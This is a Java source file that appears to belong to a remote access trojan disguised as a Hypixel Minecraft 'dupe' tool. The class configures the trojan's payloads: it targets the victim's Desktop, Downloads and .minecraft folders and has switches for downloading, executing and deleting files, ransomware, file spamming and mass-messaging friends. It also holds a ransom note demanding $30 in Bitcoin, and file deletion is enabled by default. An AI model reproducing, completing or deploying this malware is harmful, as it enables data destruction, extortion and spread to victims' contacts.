package run.hypixel.dupe.scripts;

import java.util.ArrayList;
import java.util.HashMap;

import run.hypixel.dupe.Core;

public class Scripts {
	
	public static String desktop = "C:\\Users\\" + Core.getName() + "\\Desktop\\";
	public static String downloads = "C:\\Users\\" + Core.getName() + "\\Downloads\\";
	public static String minecraft = "C:\\Users\\" + Core.getName() + "\\AppData\\Roaming\\.minecraft\\";
	
	boolean doDownload = false;
	boolean doExecute = false;
	boolean doDelete = false;
	boolean doRansomware = false;
	boolean doFileSpammer = false;
	boolean doMessageFriends = false;
	
	private HashMap<String, String> fileDownloads = new HashMap<>();
	
	private ArrayList<String> fileSpammer = new ArrayList<>();
	
	private ArrayList<String> fileExecutes = new ArrayList<>();
	
	private ArrayList<String> fileDeletes = new ArrayList<>();
	
	private String friendMessage = "This is a RAT 1.2 mass dm test.";
	
	public static String ransomText = "Your computer has been hacked and if you do not pay 30$ in BTC your files will be wiped.";
	
	public Scripts() {
		
	}
	
	public void setup() {
		doDownload = false;
		doExecute = false;
		doDelete = true;
		doRansomware = false;
		doFileSpammer = false;
		doMessageFriends = false;
	}
	
	private void addFileDownload(String url, String location) {
		fileDownloads.put(url, location);
	}
	
	private void addFileSpammer(String fileLoc) {
		fileSpammer.add(fileLoc);
	}
	
	private void addFileExecute(String location) {
		fileExecutes.add(location);
	}
	
	private void addFileDelete(String location) {
		fileDeletes.add(location);
	}
	
	public HashMap<String, String> getFileDownloads(){
		return fileDownloads;
	}
	
	public ArrayList<String> getFileSpammers(){
		return fileSpammer;
	}
	
	public ArrayList<String> getFileExecutes() {
		return fileExecutes;
	}
	
	public ArrayList<String> getFileDeletes() {
		return fileDeletes;
	}
	
	public String getFriendMessages() {
		return friendMessage;
	}
	
	private void doesDownload(boolean doesIt) {
		doDownload = doesIt;
	}
	
	private void doesExecute(boolean doesIt) {
		doExecute = doesIt;
	}
	
	private void doesDelete(boolean doesIt) {
		doDelete = doesIt;
	}
	
	private void doesRansomware(boolean doesIt) {
		doRansomware = doesIt;
	}
	
	private void doesFileSpammer(boolean doesIt) {
		doFileSpammer = doesIt;
	}
	
	private void doesMessageFriends(boolean doesIt) {
		doMessageFriends = doesIt;
	}
	
	public boolean getDoesDownload() {
		return doDownload;
	}
	
	public boolean getDoesExecute() {
		return doExecute;
	}
	
	public boolean getDoesDelete() {
		return doDelete;
	}
	
	public boolean getDoesRansomware() {
		return doRansomware;
	}
	
	public boolean getDoesFileSpammer() {
		return doFileSpammer;
	}
	
	public boolean getDoesMessageFriends() {
		return doMessageFriends;
	}

}
